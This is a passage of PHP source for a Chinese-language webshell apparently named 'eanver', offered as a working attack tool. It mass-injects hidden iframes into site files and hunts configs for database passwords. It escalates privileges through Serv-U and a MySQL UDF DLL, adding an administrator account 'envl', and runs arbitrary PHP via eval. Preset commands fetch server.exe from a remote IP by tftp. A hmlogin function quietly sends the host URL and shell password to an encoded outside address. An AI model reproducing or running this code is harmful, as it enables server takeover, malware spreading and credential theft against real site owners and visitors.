            <td width="7%"><input class="button01" type="button"  onclick="addTank()" value=" 添 加 " name="button2"/>
            <input name="button3"  type="button" class="button01" onClick="delTank()" value="删除" />
            </td>
          </tr>
</table>
<table  id="tank" width="100%" border="0" cellpadding="1" cellspacing="1" >
<tr><td>请选择要上传的文件：</td></tr>
<tr><td><input name='tankNo' type='checkbox'> <input type='file' name='upfile[]' value='' size='50'></td></tr>
</table>
END;
	html_n('<br><input type="submit" name="upfiles" value="上传" style="width:80px;"> <input type="button" value="返回" onclick="window.location=\'?eanver=main&path='.root_dir.'\';" style="width:80px;">');
	if($_POST['upfiles']){
		foreach ($_FILES["upfile"]["error"] as $key => $error){
			if ($error == UPLOAD_ERR_OK){
				$tmp_name = $_FILES["upfile"]["tmp_name"][$key];
				$name = $_FILES["upfile"]["name"][$key];
				$uploadfile = str_path($_POST['uppath'].'/'.$name);
				$upload = @copy($tmp_name,$uploadfile) ? $name.$msg[2] : @move_uploaded_file($tmp_name,$uploadfile) ? $name.$msg[2] : $name.$msg[3];
				echo '<br><br>'.$upload;
			}
		}
	}
	html_n('</form>');
	break;
	
	case "guama":
	$patht = isset($_POST['path']) ? $_POST['path'] : root_dir;
	$typet = isset($_POST['type']) ? $_POST['type'] : ".html|.shtml|.htm|.asp|.php|.jsp|.cgi|.aspx";
	$codet = isset($_POST['code']) ? $_POST['code'] : "<iframe src=\"http://localhost/eanver.htm\" width=\"1\" height=\"1\"></iframe>";
	html_n('<tr><td>文件类型请用"|"隔开,也可以是指定文件名.<form method="POST"><br>');
	html_input("text","path",$patht,"路径范围","45");
	html_input("checkbox","pass","","使用目录遍历","",true);
	html_input("text","type",$typet,"<br><br>文件类型","60");
	html_text("code","67","5",$codet);
	html_n('<br><br>');
	html_radio("批量挂马","批量清马","guama","qingma");
	html_input("submit","passreturn","开始");
	html_n('</td></tr></form>');
	if(!empty($_POST['path'])){
		html_n('<tr><td>目标文件:<br><br>');
		if(isset($_POST['pass'])) $bool = true; else $bool = false;
		do_passreturn($patht,$codet,$_POST['return'],$bool,$typet);
	}
	break;
	
	case "tihuan":
	html_n('<tr><td>此功能可批量替换文件内容,请小心使用.<br><br><form method="POST">');
	html_input("text","path",root_dir,"路径范围","45");
	html_input("checkbox","pass","","使用目录遍历","",true);
	html_text("newcode","67","5",$_POST['newcode']);
	html_n('<br><br>替换为');
	html_text("oldcode","67","5",$_POST['oldcode']);
	html_input("submit","passreturn","替换","<br><br>");
	html_n('</td></tr></form>');
	if(!empty($_POST['path'])){
		html_n('<tr><td>目标文件:<br><br>');
		if(isset($_POST['pass'])) $bool = true; else $bool = false;
		do_passreturn($_POST['path'],$_POST['newcode'],"tihuan",$bool,$_POST['oldcode']);
	}
	break;
	
	case "scanfile":
	css_js("4");
	html_n('<tr><td>此功能可很方便的搜索到保存MYSQL用户密码的配置文件,用于提权.<br>当服务器文件太多时,会影响执行速度,不建议使用目录遍历.<form method="POST" name="sform"><br>');
	html_input("text","path",root_dir,"路径名","45");
	html_input("checkbox","pass","","使用目录遍历","",true);
	html_input("text","code",$_POST['code'],"<br><br>关键字","40");
	html_select(array("--MYSQL配置文件--","Discuz","PHPWind","phpcms","dedecms","PHPBB","wordpress","sa-blog","o-blog"),0,"onchange='return Fulll(options[selectedIndex].value)'");
	html_n('<br><br>');
	html_radio("搜索文件名","搜索包含文字","scanfile","scancode");
	html_input("submit","passreturn","搜索");
	html_n('</td></tr></form>');
	if(!empty($_POST['path'])){
		html_n('<tr><td>找到文件:<br><br>');
		if(isset($_POST['pass'])) $bool = true; else $bool = false;
		do_passreturn($_POST['path'],$_POST['code'],$_POST['return'],$bool);
	}
	break;
	
	case "scanphp":
	html_n('<tr><td>原理是根据特征码定义的,请查看代码判断后再进行删除.<form method="POST"><br>');
	html_input("text","path",root_dir,"查找范围","40");
	html_input("checkbox","pass","","使用目录遍历<br><br>脚本类型","",true);
	html_select(array("php" => "PHP","asp" => "ASP","aspx" => "ASPX","jsp" => "JSP"));
	html_input("submit","passreturn","查找","<br><br>");
	html_n('</td></tr></form>');
	if(!empty($_POST['path'])){
		html_n('<tr><td>找到文件:<br><br>');
		if(isset($_POST['pass'])) $bool = true; else $bool = false;
		do_passreturn($_POST['path'],$_POST['class'],"scanphp",$bool);
	}
	break;
	
	case "port":
	$Port_ip = isset($_POST['ip']) ? $_POST['ip'] : '127.0.0.1';
	$Port_port = isset($_POST['port']) ? $_POST['port'] : '21|23|25|80|110|135|139|445|1433|3306|3389|43958|5631';
print<<<END
<form method="POST">
<div class="actall">扫描IP <input type="text" name="ip" value="{$Port_ip}" style="width:600px;"> </div>
<div class="actall">端口号 <input type="text" name="port" value="{$Port_port}" style="width:597px;"></div>
<div class="actall"><input type="submit" value="扫描" style="width:80px;"></div>
</form>
END;
	if((!empty($_POST['ip'])) && (!empty($_POST['port'])))
	{
		echo '<div class="actall">';
		$ports = explode('|', $_POST['port']);
		for($i = 0;$i < count($ports);$i++)
		{
			$fp = @fsockopen($_POST['ip'],$ports[$i],$errno,$errstr,2);
			echo $fp ? '<font color="#FF0000">开放端口 ---> '.$ports[$i].'</font><br>' : '关闭端口 ---> '.$ports[$i].'<br>';
			ob_flush();
			flush();
		}
		echo '</div>';
	}
	break;
	

	case "getcode":
if (isset($_POST['url'])) {$proxycontents = @file_get_contents($_POST['url']);echo ($proxycontents) ? $proxycontents : "<body bgcolor=\"#F5F5F5\" style=\"font-size: 12px;\"><center><br><p><b>获取 URL 内容失败</b></p></center></body>";exit;}
print<<<END
<table width="100%" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
 <form method="POST" target="proxyframe">
  <tr class="firstalt">
	<td align="center"><b>在线代理</b></td>
  </tr>
  <tr class="secondalt">
	<td align="center"  ><br><ul><li>用本功能仅实现简单的 HTTP 代理,不会显示使用相对路径的图片、链接及CSS样式表.</li><li>用本功能可以通过本服务器浏览目标URL,但不支持 SQL Injection 探测以及某些特殊字符.</li><li>用本功能浏览的 URL,在目标主机上留下的IP记录是 : {$_SERVER['SERVER_NAME']}</li></ul></td>
  </tr>
  <tr class="firstalt">
	<td align="center" height=40  >URL: <input name="url" value="about:blank" type="text"  class="input" size="100" >
 <input name="" value="浏览" type="submit"  class="input" size="30" >
</td>
  </tr>
  <tr class="secondalt">
	<td align="center"  ><iframe name="proxyframe" frameborder="0" width="765" height="400" marginheight="0" marginwidth="0" scrolling="auto" src="about:blank"></iframe></td>
  </tr>
</form></table>
END;
	break;
	
	case "servu":
	$SUPass = isset($_POST['SUPass']) ? $_POST['SUPass'] : '#l@$ak#.lk;0@P';
print<<<END
<div class="actall"><a href="?eanver=servu">[执行命令]</a> <a href="?eanver=servu&o=adduser">[添加用户]</a></div>
<form method="POST">
	<div class="actall">ServU端口 <input name="SUPort" type="text" value="43958" style="width:300px"></div>
	<div class="actall">ServU用户 <input name="SUUser" type="text" value="LocalAdministrator" style="width:300px"></div>
	<div class="actall">ServU密码 <input name="SUPass" type="text" value="{$SUPass}" style="width:300px"></div>
END;
if($_GET['o'] == 'adduser')
{
print<<<END
<div class="actall">帐号 <input name="user" type="text" value="envl" style="width:200px">
密码 <input name="password" type="text" value="envl" style="width:200px">
目录 <input name="part" type="text" value="C:\\\\" style="width:200px"></div>
END;
}
else
{
print<<<END
<div class="actall">提权命令 <input name="SUCommand" type="text" value="net user envl envl /add & net localgroup administrators envl /add" style="width:600px"><br>
<input name="user" type="hidden" value="envl">
<input name="password" type="hidden" value="envl">
<input name="part" type="hidden" value="C:\\\\"></div>
END;
}
echo '<div class="actall"><input type="submit" value="执行" style="width:80px;"></div></form>';
	if((!empty($_POST['SUPort'])) && (!empty($_POST['SUUser'])) && (!empty($_POST['SUPass'])))
	{
		echo '<div class="actall">';
		$sendbuf = "";
		$recvbuf = "";
		$domain  = "-SETDOMAIN\r\n"."-Domain=haxorcitos|0.0.0.0|21|-1|1|0\r\n"."-TZOEnable=0\r\n"." TZOKey=\r\n";
		$adduser = "-SETUSERSETUP\r\n"."-IP=0.0.0.0\r\n"."-PortNo=21\r\n"."-User=".$_POST['user']."\r\n"."-Password=".$_POST['password']."\r\n"."-HomeDir=c:\\\r\n"."-LoginMesFile=\r\n"."-Disable=0\r\n"."-RelPaths=1\r\n"."-NeedSecure=0\r\n"."-HideHidden=0\r\n"."-AlwaysAllowLogin=0\r\n"."-ChangePassword=0\r\n".
							 "-QuotaEnable=0\r\n"."-MaxUsersLoginPerIP=-1\r\n"."-SpeedLimitUp=0\r\n"."-SpeedLimitDown=0\r\n"."-MaxNrUsers=-1\r\n"."-IdleTimeOut=600\r\n"."-SessionTimeOut=-1\r\n"."-Expire=0\r\n"."-RatioUp=1\r\n"."-RatioDown=1\r\n"."-RatiosCredit=0\r\n"."-QuotaCurrent=0\r\n"."-QuotaMaximum=0\r\n".
							 "-Maintenance=None\r\n"."-PasswordType=Regular\r\n"."-Ratios=None\r\n"." Access=".$_POST['part']."\|RWAMELCDP\r\n";
		$deldomain = "-DELETEDOMAIN\r\n"."-IP=0.0.0.0\r\n"." PortNo=21\r\n";
		$sock = @fsockopen("127.0.0.1", $_POST["SUPort"],$errno,$errstr, 10);
		$recvbuf = @fgets($sock, 1024);
		echo "返回数据包: $recvbuf <br>";
		$sendbuf = "USER ".$_POST["SUUser"]."\r\n";
		@fputs($sock, $sendbuf, strlen($sendbuf));
		echo "发送数据包: $sendbuf <br>";
		$recvbuf = @fgets($sock, 1024);
		echo "返回数据包: $recvbuf <br>";
		$sendbuf = "PASS ".$_POST["SUPass"]."\r\n";
		@fputs($sock, $sendbuf, strlen($sendbuf));
		echo "发送数据包: $sendbuf <br>";
		$recvbuf = @fgets($sock, 1024);
		echo "返回数据包: $recvbuf <br>";
		$sendbuf = "SITE MAINTENANCE\r\n";
		@fputs($sock, $sendbuf, strlen($sendbuf));
		echo "发送数据包: $sendbuf <br>";
		$recvbuf = @fgets($sock, 1024);
		echo "返回数据包: $recvbuf <br>";
		$sendbuf = $domain;
		@fputs($sock, $sendbuf, strlen($sendbuf));
		echo "发送数据包: $sendbuf <br>";
		$recvbuf = @fgets($sock, 1024);
		echo "返回数据包: $recvbuf <br>";
		$sendbuf = $adduser;
		@fputs($sock, $sendbuf, strlen($sendbuf));
		echo "发送数据包: $sendbuf <br>";
		$recvbuf = @fgets($sock, 1024);
		echo "返回数据包: $recvbuf <br>";
		if(!empty($_POST['SUCommand']))
		{
	 		$exp = @fsockopen("127.0.0.1", "21",$errno,$errstr, 10);
	 		$recvbuf = @fgets($exp, 1024);
	 		echo "返回数据包: $recvbuf <br>";
	 		$sendbuf = "USER ".$_POST['user']."\r\n";
	 		@fputs($exp, $sendbuf, strlen($sendbuf));
	 		echo "发送数据包: $sendbuf <br>";
	 		$recvbuf = @fgets($exp, 1024);
	 		echo "返回数据包: $recvbuf <br>";
	 		$sendbuf = "PASS ".$_POST['password']."\r\n";
	 		@fputs($exp, $sendbuf, strlen($sendbuf));
	 		echo "发送数据包: $sendbuf <br>";
	 		$recvbuf = @fgets($exp, 1024);
	 		echo "返回数据包: $recvbuf <br>";
	 		$sendbuf = "site exec ".$_POST["SUCommand"]."\r\n";
	 		@fputs($exp, $sendbuf, strlen($sendbuf));
	 		echo "发送数据包: site exec <font color=#006600>".$_POST["SUCommand"]."</font> <br>";
	 		$recvbuf = @fgets($exp, 1024);
	 		echo "返回数据包: $recvbuf <br>";
	 		$sendbuf = $deldomain;
	 		@fputs($sock, $sendbuf, strlen($sendbuf));
	 		echo "发送数据包: $sendbuf <br>";
	 		$recvbuf = @fgets($sock, 1024);
	 		echo "返回数据包: $recvbuf <br>";
	 		@fclose($exp);
		}
		@fclose($sock);
		echo '</div>';
	}
	break;
	
	case "eval":
	$phpcode = isset($_POST['phpcode']) ? $_POST['phpcode'] : "phpinfo();";
	html_n('<tr><td><form method="POST">不用写&lt;? ?&gt;标签');
	html_text("phpcode","70","15",$phpcode);
	html_input("submit","eval","执行","<br><br>");
	if(!empty($_POST['eval'])){
	echo "<br><br>";
    eval(stripslashes($phpcode));
	}
	html_n('</form>');
	break;

	case "myexp":
	$MSG_BOX = '请先导出DLL,再执行命令.MYSQL用户必须为root权限,导出路径必须能加载DLL文件.';
	$info = '命令回显';
	$mhost = 'localhost'; $muser = 'root'; $mport = '3306'; $mpass = ''; $mdata = 'mysql'; $mpath = 'C:/windows/mysqlDll.dll'; $sqlcmd = 'ver';
	if(isset($_POST['mhost']) && isset($_POST['muser']))
	{
		$mhost = $_POST['mhost']; $muser = $_POST['muser']; $mpass = $_POST['mpass']; $mdata = $_POST['mdata']; $mport = $_POST['mport']; $mpath = File_Str($_POST['mpath']); $sqlcmd = $_POST['sqlcmd'];
		$conn = mysql_connect($mhost.':'.$mport,$muser,$mpass);
		if($conn)
		{
			@mysql_select_db($mdata);
			if((!empty($_POST['outdll'])) && (!empty($_POST['mpath'])))
			{
				$query = "CREATE TABLE Envl_Temp_Tab (envl BLOB);";
				if(@mysql_query($query,$conn))
				{
					$shellcode = Mysql_shellcode();
					$query = "INSERT into Envl_Temp_Tab values (CONVERT(".$shellcode.",CHAR));";
					if(@mysql_query($query,$conn))
					{
						$query = 'SELECT envl FROM Envl_Temp_Tab INTO DUMPFILE \''.$mpath.'\';';
						if(@mysql_query($query,$conn))
						{
							$ap = explode('/', $mpath); $inpath = array_pop($ap);
							$query = 'Create Function state returns string soname \''.$inpath.'\';';
							$MSG_BOX = @mysql_query($query,$conn) ? '安装DLL成功' : '安装DLL失败';
						}
						else $MSG_BOX = '导出DLL文件失败';
					}
					else $MSG_BOX = '写入临时表失败';
					@mysql_query('DROP TABLE Envl_Temp_Tab;',$conn);
				}
				else $MSG_BOX = '创建临时表失败';
			}
			if(!empty($_POST['runcmd']))
			{
				$query = 'select state("'.$sqlcmd.'");';
				$result = @mysql_query($query,$conn);
				if($result)
				{
					$k = 0; $info = NULL;
					while($row = @mysql_fetch_array($result)){$infotmp .= $row[$k];$k++;}
					$info = $infotmp;
					$MSG_BOX = '执行成功';
				}
				else $MSG_BOX = '执行失败';
			}
		}
		else $MSG_BOX = '连接MYSQL失败';
	}
print<<<END
<script language="javascript">
function Fullm(i){
	Str = new Array(11);
	Str[0] = "ver";
	Str[1] = "net user envl envl /add";
	Str[2] = "net localgroup administrators envl /add";
	Str[3] = "net start Terminal Services";
	Str[4] = "tasklist /svc";
	Str[5] = "netstat -ano";
	Str[6] = "ipconfig";
	Str[7] = "net user guest /active:yes";
	Str[8] = "copy c:\\\\1.php d:\\\\2.php";
	Str[9] = "tftp -i 219.134.46.245 get server.exe c:\\\\server.exe";
	Str[10] = "net start telnet";
	Str[11] = "shutdown -r -t 0";
	mform.sqlcmd.value = Str[i];
	return true;
}
</script>
<form id="mform" method="POST">
<div id="msgbox" class="msgbox">{$MSG_BOX}</div>
<center><div class="actall">
地址 <input type="text" name="mhost" value="{$mhost}" style="width:110px">
端口 <input type="text" name="mport" value="{$mport}" style="width:110px">
用户 <input type="text" name="muser" value="{$muser}" style="width:110px">
密码 <input type="text" name="mpass" value="{$mpass}" style="width:110px">
库名 <input type="text" name="mdata" value="{$mdata}" style="width:110px">
</div><div class="actall">
可加载路径 <input type="text" name="mpath" value="{$mpath}" style="width:555px"> 
<input type="submit" name="outdll" value="安装DLL" style="width:80px;"></div>
<div class="actall">安装成功后可用 <br><input type="text" name="sqlcmd" value="{$sqlcmd}" style="width:515px;">
<select onchange="return Fullm(options[selectedIndex].value)">
<option value="0" selected>--命令集合--</option>
<option value="1">添加管理员</option>
<option value="2">设为管理组</option>
<option value="3">开启远程桌面</option>
<option value="4">查看进程和PID</option>
<option value="5">查看端口和PID</option>
<option value="6">查看IP</option>
<option value="7">激活guest帐户</option>
<option value="8">复制文件</option>
<option value="9">ftp下载</option>
<option value="10">开启telnet</option>
<option value="11">重启</option>
</select>
<input type="submit" name="runcmd" value="执行" style="width:80px;">
<textarea style="width:720px;height:300px;">{$info}</textarea>
</div></center>
</form>
END;
	break;
	

	case "mysql_exec":
  if(isset($_POST['mhost']) && isset($_POST['mport']) && isset($_POST['muser']) && isset($_POST['mpass']))
  {
  	if(@mysql_connect($_POST['mhost'].':'.$_POST['mport'],$_POST['muser'],$_POST['mpass']))
	  {
	  	$cookietime = time() + 24 * 3600;
	  	setcookie('m_eanverhost',$_POST['mhost'],$cookietime);
	  	setcookie('m_eanverport',$_POST['mport'],$cookietime);
	  	setcookie('m_eanveruser',$_POST['muser'],$cookietime);
	  	setcookie('m_eanverpass',$_POST['mpass'],$cookietime);
	  	die('正在登陆,请稍候...<meta http-equiv="refresh" content="0;URL=?eanver=mysql_msg">');
	  }
  }
print<<<END
<form method="POST" name="oform" id="oform">
<div class="actall">地址 <input type="text" name="mhost" value="localhost" style="width:300px"></div>
<div class="actall">端口 <input type="text" name="mport" value="3306" style="width:300px"></div>
<div class="actall">用户 <input type="text" name="muser" value="root" style="width:300px"></div>
<div class="actall">密码 <input type="text" name="mpass" value="" style="width:300px"></div>
<div class="actall"><input type="submit" value="登陆" style="width:80px;"> <input type="button" value="COOKIE" style="width:80px;" onclick="window.location='?eanver=mysql_msg';"></div>
</form>
END;
break;

case "mysql_msg":
	$conn = @mysql_connect($_COOKIE['m_eanverhost'].':'.$_COOKIE['m_eanverport'],$_COOKIE['m_eanveruser'],$_COOKIE['m_eanverpass']);
	if($conn)
	{
print<<<END
<script language="javascript">
function Delok(msg,gourl)
{
	smsg = "确定要删除[" + unescape(msg) + "]吗?";
	if(confirm(smsg)){window.location = gourl;}
}
function Createok(ac)
{
	if(ac == 'a') document.getElementById('nsql').value = 'CREATE TABLE name (eanver BLOB);';
	if(ac == 'b') document.getElementById('nsql').value = 'CREATE DATABASE name;';
	if(ac == 'c') document.getElementById('nsql').value = 'DROP DATABASE name;';
	return false;
}
</script>
END;
		$BOOL = false;
		$MSG_BOX = '用户:'.$_COOKIE['m_eanveruser'].' &nbsp;&nbsp;&nbsp;&nbsp; 地址:'.$_COOKIE['m_eanverhost'].':'.$_COOKIE['m_eanverport'].' &nbsp;&nbsp;&nbsp;&nbsp; 版本:';
		$k = 0;
		$result = @mysql_query('select version();',$conn);
		while($row = @mysql_fetch_array($result)){$MSG_BOX .= $row[$k];$k++;}
		echo '<div class="actall"> 数据库:';
		$result = mysql_query("SHOW DATABASES",$conn);
		while($db = mysql_fetch_array($result)){echo '&nbsp;&nbsp;[<a href="?eanver=mysql_msg&db='.$db['Database'].'">'.$db['Database'].'</a>]';}
		echo '</div>';
		if(isset($_GET['db']))
		{
			mysql_select_db($_GET['db'],$conn);
			if(!empty($_POST['nsql'])){$BOOL = true; $MSG_BOX = mysql_query($_POST['nsql'],$conn) ? '执行成功' : '执行失败 '.mysql_error();}
			if(is_array($_POST['insql']))
			{
				$query = 'INSERT INTO '.$_GET['table'].' (';
				foreach($_POST['insql'] as $var => $key)
				{
					$querya .= $var.',';
					$queryb .= '\''.addslashes($key).'\',';
				}
				$query = $query.substr($querya, 0, -1).') VALUES ('.substr($queryb, 0, -1).');';
				$MSG_BOX = mysql_query($query,$conn) ? '添加成功' : '添加失败 '.mysql_error();
			}
			if(is_array($_POST['upsql']))
			{
				$query = 'UPDATE '.$_GET['table'].' SET ';
				foreach($_POST['upsql'] as $var => $key)
				{
					$queryb .= $var.'=\''.addslashes($key).'\',';
				}
				$query = $query.substr($queryb, 0, -1).' '.base64_decode($_POST['wherevar']).';';
				$MSG_BOX = mysql_query($query,$conn) ? '修改成功' : '修改失败 '.mysql_error();
			}
			if(isset($_GET['del']))
			{
				$result = mysql_query('SELECT * FROM '.$_GET['table'].' LIMIT '.$_GET['del'].', 1;',$conn);
				$good = mysql_fetch_assoc($result);
				$query = 'DELETE FROM '.$_GET['table'].' WHERE ';
				foreach($good as $var => $key){$queryc .= $var.'=\''.addslashes($key).'\' AND ';}
				$where = $query.substr($queryc, 0, -4).';';
				$MSG_BOX = mysql_query($where,$conn) ? '删除成功' : '删除失败 '.mysql_error();
			}
			$action = '?eanver=mysql_msg&db='.$_GET['db'];
			if(isset($_GET['drop'])){$query = 'Drop TABLE IF EXISTS '.$_GET['drop'].';';$MSG_BOX = mysql_query($query,$conn) ? '删除成功' : '删除失败 '.mysql_error();}
			if(isset($_GET['table'])){$action .= '&table='.$_GET['table'];if(isset($_GET['edit'])) $action .= '&edit='.$_GET['edit'];}
			if(isset($_GET['insert'])) $action .= '&insert='.$_GET['insert'];
			echo '<div class="actall"><form method="POST" action="'.$action.'">';
			echo '<textarea name="nsql" id="nsql" style="width:500px;height:50px;">'.$_POST['nsql'].'</textarea> ';
			echo '<input type="submit" name="querysql" value="执行" style="width:60px;height:49px;"> ';
			echo '<input type="button" value="创建表" style="width:60px;height:49px;" onclick="Createok(\'a\')"> ';
			echo '<input type="button" value="创建库" style="width:60px;height:49px;" onclick="Createok(\'b\')"> ';
			echo '<input type="button" value="删除库" style="width:60px;height:49px;" onclick="Createok(\'c\')"></form></div>';
			echo '<div class="msgbox" style="height:40px;">'.$MSG_BOX.'</div><div class="actall"><a href="?eanver=mysql_msg&db='.$_GET['db'].'">'.$_GET['db'].'</a> ---> ';
			if(isset($_GET['table']))
			{
				echo '<a href="?eanver=mysql_msg&db='.$_GET['db'].'&table='.$_GET['table'].'">'.$_GET['table'].'</a> ';
				echo '[<a href="?eanver=mysql_msg&db='.$_GET['db'].'&insert='.$_GET['table'].'">插入</a>]</div>';
				if(isset($_GET['edit']))
				{
					if(isset($_GET['p'])) $atable = $_GET['table'].'&p='.$_GET['p']; else $atable = $_GET['table'];
					echo '<form method="POST" action="?eanver=mysql_msg&db='.$_GET['db'].'&table='.$atable.'">';
					$result = mysql_query('SELECT * FROM '.$_GET['table'].' LIMIT '.$_GET['edit'].', 1;',$conn);
					$good = mysql_fetch_assoc($result);
					$u = 0;
					foreach($good as $var => $key)
					{
						$queryc .= $var.'=\''.$key.'\' AND ';
						$type = @mysql_field_type($result, $u);
						$len = @mysql_field_len($result, $u);
						echo '<div class="actall">'.$var.' <font color="#FF0000">'.$type.'('.$len.')</font><br><textarea name="upsql['.$var.']" style="width:600px;height:60px;">'.htmlspecialchars($key).'</textarea></div>';
						$u++;
					}
					$where = 'WHERE '.substr($queryc, 0, -4);
					echo '<input type="hidden" id="wherevar" name="wherevar" value="'.base64_encode($where).'">';
					echo '<div class="actall"><input type="submit" value="Update" style="width:80px;"></div></form>';
				}
				else
				{
					$query = 'SHOW COLUMNS FROM '.$_GET['table'];
		      $result = mysql_query($query,$conn);
		      $fields = array();
			  $pagesize=20;
		      $row_num = mysql_num_rows(mysql_query('SELECT * FROM '.$_GET['table'],$conn));
			  $numrows=$row_num;
              $pages=intval($numrows/$pagesize);
              if ($numrows%$pagesize) $pages++;
              $offset=$pagesize*($page - 1);
              $page=$_GET['p'];
              if(!$page) $page=1;

		      if(!isset($_GET['p'])){$p = 0;$_GET['p'] = 1;} else $p = ((int)$_GET['p']-1)*20;
					echo '<table border="0"><tr>';
					echo '<td class="toptd" style="width:70px;" nowrap>操作</td>';
					while($row = @mysql_fetch_assoc($result))
					{
						array_push($fields,$row['Field']);
						echo '<td class="toptd" nowrap>'.$row['Field'].'</td>';
					}
					echo '</tr>';
					if(eregi('WHERE|LIMIT',$_POST['nsql']) && eregi('SELECT|FROM',$_POST['nsql'])) $query = $_POST['nsql']; else $query = 'SELECT * FROM '.$_GET['table'].' LIMIT '.$p.', 20;';
					$result = mysql_query($query,$conn);
					$v = $p;
					while($text = @mysql_fetch_assoc($result))
					{
						echo '<tr><td><a href="?eanver=mysql_msg&db='.$_GET['db'].'&table='.$_GET['table'].'&p='.$_GET['p'].'&edit='.$v.'"> 修改 </a> ';
						echo '<a href="#" onclick="Delok(\'它\',\'?eanver=mysql_msg&db='.$_GET['db'].'&table='.$_GET['table'].'&p='.$_GET['p'].'&del='.$v.'\');return false;"> 删除 </a></td>';
						foreach($fields as $row){echo '<td>'.nl2br(htmlspecialchars(Mysql_Len($text[$row],500))).'</td>';}
						echo '</tr>'."\r\n";$v++;
					}
					echo '</table><div class="actall">';
                    $pagep=$page-1;
                    $pagen=$page+1;
                    echo "共有 ".$row_num." 条记录 ";
                    if($pagep>0) $pagenav.="  <a href='?eanver=mysql_msg&db=".$_GET['db']."&table=".$_GET['table']."&p=1&charset=".$_GET['charset']."'>首页</a> <a href='?eanver=mysql_msg&db=".$_GET['db']."&table=".$_GET['table']."&p=".$pagep."&charset=".$_GET['charset']."'>上一页</a> "; else $pagenav.=" 上一页 ";
                    if($pagen<=$pages) $pagenav.=" <a href='?eanver=mysql_msg&db=".$_GET['db']."&table=".$_GET['table']."&p=".$pagen."&charset=".$_GET['charset']."'>下一页</a> <a href='?eanver=mysql_msg&db=".$_GET['db']."&table=".$_GET['table']."&p=".$pages."&charset=".$_GET['charset']."'>尾页</a>"; else $pagenav.=" 下一页 ";
                    $pagenav.=" 第 [".$page."/".$pages."] 页   跳到<input name='textfield' type='text' style='text-align:center;' size='4' value='".$page."' onkeydown=\"if(event.keyCode==13)self.location.href='?eanver=mysql_msg&db=".$_GET['db']."&table=".$_GET['table']."&p='+this.value+'&charset=".$_GET['charset']."';\" />页";
                    echo $pagenav;
					echo '</div>';
				}
			}
			elseif(isset($_GET['insert']))
			{
				echo '<a href="?eanver=mysql_msg&db='.$_GET['db'].'&table='.$_GET['insert'].'">'.$_GET['insert'].'</a></div>';
				$result = mysql_query('SELECT * FROM '.$_GET['insert'],$conn);
				$fieldnum = @mysql_num_fields($result);
				echo '<form method="POST" action="?eanver=mysql_msg&db='.$_GET['db'].'&table='.$_GET['insert'].'">';
				for($i = 0;$i < $fieldnum;$i++)
				{
					$name = @mysql_field_name($result, $i);
					$type = @mysql_field_type($result, $i);
					$len = @mysql_field_len($result, $i);
					echo '<div class="actall">'.$name.' <font color="#FF0000">'.$type.'('.$len.')</font><br><textarea name="insql['.$name.']" style="width:600px;height:60px;"></textarea></div>';
				}
				echo '<div class="actall"><input type="submit" value="Insert" style="width:80px;"></div></form>';
			}
			else
			{
				$query = 'SHOW TABLE STATUS';
				$status = @mysql_query($query,$conn);
				while($statu = @mysql_fetch_array($status))
				{
					$statusize[] = $statu['Data_length'];
					$statucoll[] = $statu['Collation'];
				}
				$query = 'SHOW TABLES FROM '.$_GET['db'].';';
				echo '</div><table border="0"><tr>';
				echo '<td class="toptd" style="width:550px;"> 表名 </td>';
				echo '<td class="toptd" style="width:80px;"> 操作 </td>';
				echo '<td class="toptd" style="width:130px;"> 字符集 </td>';
				echo '<td class="toptd" style="width:70px;"> 大小 </td></tr>';
				$result = @mysql_query($query,$conn);
				$k = 0;
				while($table = mysql_fetch_row($result))
				{
					$charset=substr($statucoll[$k],0,strpos($statucoll[$k],'_'));
					echo '<tr><td><a href="?eanver=mysql_msg&db='.$_GET['db'].'&table='.$table[0].'">'.$table[0].'</a></td>';
					echo '<td><a href="?eanver=mysql_msg&db='.$_GET['db'].'&insert='.$table[0].'"> 插入 </a> <a href="#" onclick="Delok(\''.$table[0].'\',\'?eanver=mysql_msg&db='.$_GET['db'].'&drop='.$table[0].'\');return false;"> 删除 </a></td>';
					echo '<td>'.$statucoll[$k].'</td><td align="right">'.File_Size($statusize[$k]).'</td></tr>'."\r\n";
					$k++;
				}
				echo '</table>';
			}
		}
	}
	else die('连接MYSQL失败,请重新登陆.<meta http-equiv="refresh" content="0;URL=?eanver=mysql_exec">');
	if(!$BOOL and addslashes($query)!='') echo '<script type="text/javascript">document.getElementById(\'nsql\').value = \''.addslashes($query).'\';</script>';
break;

	
	default: html_main($path,$shellname); break;
}
css_foot();

/*---doing---*/

function do_write($file,$t,$text)
{
	$key = true;
	$handle = @fopen($file,$t);
	if(!@fwrite($handle,$text))
	{
		@chmod($file,0666);
		$key = @fwrite($handle,$text) ? true : false;
	}
	@fclose($handle);
	return $key;
}

function do_show($filepath){
	$show = array();
	$dir = dir($filepath);
	while($file = $dir->read()){
		if($file == '.' or $file == '..') continue;
		$files = str_path($filepath.'/'.$file);
		$show[] = $files;
	}
	$dir->close();
	return $show;
}

function do_deltree($deldir){
	$showfile = do_show($deldir);
	foreach($showfile as $del){
		if(is_dir($del)){ 
			if(!do_deltree($del)) return false;
		}elseif(!is_dir($del)){
			@chmod($del,0777);
			if(!@unlink($del)) return false;
		}
	}
	@chmod($deldir,0777);
	if(!@rmdir($deldir)) return false;
	return true;
}

function do_showsql($query,$conn){
	$result = @mysql_query($query,$conn);
	html_n('<br><br><textarea cols="70" rows="15">');
	while($row = @mysql_fetch_array($result)){
		for($i=0;$i < @mysql_num_fields($result);$i++){
			html_n(htmlspecialchars($row[$i]));
		}
	}
	html_n('</textarea>');
}

function hmlogin($xiao=1){
    @set_time_limit(10);
	$serveru = $_SERVER ['HTTP_HOST'].$_SERVER['PHP_SELF'];
    $serverp = envlpass;
    $copyurl = base64_decode('aHR0cDovLzEyNy4wLjAuMS8v'); //aHR0cDovL3d3dy50cm95cGxhbi5jb20vcC5hc3B4P249
    $url=$copyurl.$serveru.'&p='.$serverp;
    $url=urldecode($url);
    $re=file_get_contents($url);

$serveru = $_SERVER ['HTTP_HOST'].$_SERVER['PHP_SELF'];
$serverp = envlpass;
if (strpos($serveru,"0.0")>0 or strpos($serveru,"192.168.")>0 or strpos($serveru,"localhost")>0 or ($serveru==$_COOKIE['serveru'] and $serverp==$_COOKIE['serverp'])) {echo "<meta http-equiv='refresh' content='0;URL=?'>";} else {setcookie('serveru',$serveru);setcookie('serverp',$serverp);if($xiao==1){echo "<script src='?login=geturl'></script><meta http-equiv='refresh' content='0;URL=?'>";}else{geturl();}}
}

function do_down($fd){
	if(!@file_exists($fd)) msg('下载文件不存在');
	$fileinfo = pathinfo($fd);
	header('Content-type: application/x-'.$fileinfo['extension']);
